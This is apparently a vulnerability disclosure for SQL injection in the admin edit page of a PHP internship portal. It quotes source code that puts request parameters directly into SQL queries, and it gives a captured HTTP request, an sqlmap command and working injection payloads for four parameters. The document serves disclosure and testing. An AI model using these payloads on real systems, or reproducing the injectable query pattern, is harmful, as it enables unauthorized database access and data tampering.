@@ -1,0 +1,107 @@
+Internship Portal Management System - SQL Injection on (admin/edit_admin_query.php?admin_id=XX) 
+
+Vendor Homepage:
+https://www.sourcecodester.com/php/11712/internship-portal-management-system.html 
+
+Version:V1.0
+
+Tested on: PHP, Apache, MySQL
+
+Affected Page:
+edit_admin_query.php
+On this page, username/password/name/admin_id parameters are vulnerable to SQL Injection Attack 
+
+Source Code(intern_sys/admin/edit_admin_query.php):
+if(ISSET($_POST['update_admin'])){
+	$username = $_POST['username'];
+	$password = $_POST['password'];
+	$name = $_POST['name'];
+	$q_admin = $conn->query("SELECT * FROM `admin` WHERE `username` = '$username' and admin_id != '$_REQUEST[admin_id]' ") or die($conn->error);
+	$v_admin = $q_admin->num_rows;
+	if($v_admin > 0){
+		echo '<script>alert("Username already taken");</script>';
+		echo '<script>window.location = "edit_admin.php?admin_id=" +'.$_REQUEST['admin_id'].'</script>';
+	}else{
+		$conn->query("UPDATE `admin` SET `username` = '$username', `password` = '$password', `name` = '$name' WHERE `admin_id` = '$_REQUEST[admin_id]'") or die($conn->error);
+		header('location:admin.php');
+	}
+}
+
+Proof of vulnerability(Verify using the sqlmap tool after logining):
+
+Requests:
+POST /intern_sys/admin/edit_admin_query.php?admin_id=2 HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Content-Length: 62
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=bpfjr9o3euj8d6ognte8obmo85
+Origin: http:// localhost
+Referer: http:// localhost /intern_sys/admin/edit_admin.php?admin_id=2
+Upgrade-Insecure-Requests: 1
+Accept-Encoding: gzip
+
+name=Administrator&password=admin&update_admin=&username=admin
+
+-> sqlmap -r 1.txt(above request package) --batch
+
+Output:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: name=Administrator&password=admin&update_admin=&username=admin' RLIKE (SELECT (CASE WHEN (2151=2151) THEN 0x61646d696e ELSE 0x28 END))-- Ycfc
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: name=Administrator&password=admin&update_admin=&username=admin' AND GTID_SUBSET(CONCAT(0x7170706b71,(SELECT (ELT(5505=5505,1))),0x7162766a71),5505)-- sbfy
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: name=Administrator&password=admin&update_admin=&username=admin' AND (SELECT 3081 FROM (SELECT(SLEEP(5)))ZuaD)-- hHvO
+---
+---
+Parameter: password (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: name=Administrator&password=admin' RLIKE (SELECT (CASE WHEN (7376=7376) THEN 0x61646d696e ELSE 0x28 END))-- FQep&update_admin=&username=admin
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: name=Administrator&password=admin' AND EXTRACTVALUE(9837,CONCAT(0x5c,0x7170706b71,(SELECT (ELT(9837=9837,1))),0x7162766a71))-- QeEi&update_admin=&username=admin
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 RLIKE time-based blind
+    Payload: name=Administrator&password=admin' RLIKE SLEEP(5)-- pihY&update_admin=&username=admin
+---
+---
+Parameter: name (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: name=Administrator' RLIKE (SELECT (CASE WHEN (8033=8033) THEN 0x41646d696e6973747261746f72 ELSE 0x28 END))-- ePKC&password=admin&update_admin=&username=admin
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: name=Administrator' AND EXTRACTVALUE(6741,CONCAT(0x5c,0x7170706b71,(SELECT (ELT(6741=6741,1))),0x7162766a71))-- XXjC&password=admin&update_admin=&username=admin
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 RLIKE time-based blind
+    Payload: name=Administrator' RLIKE SLEEP(5)-- oEJQ&password=admin&update_admin=&username=admin
+---
+---
+Parameter: admin_id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: admin_id=2' OR NOT 1608=1608#
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: admin_id=2' AND GTID_SUBSET(CONCAT(0x7170706b71,(SELECT (ELT(2520=2520,1))),0x7162766a71),2520)-- QNjg
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: admin_id=2' AND (SELECT 5170 FROM (SELECT(SLEEP(5)))xVYW)-- WTxy
+---
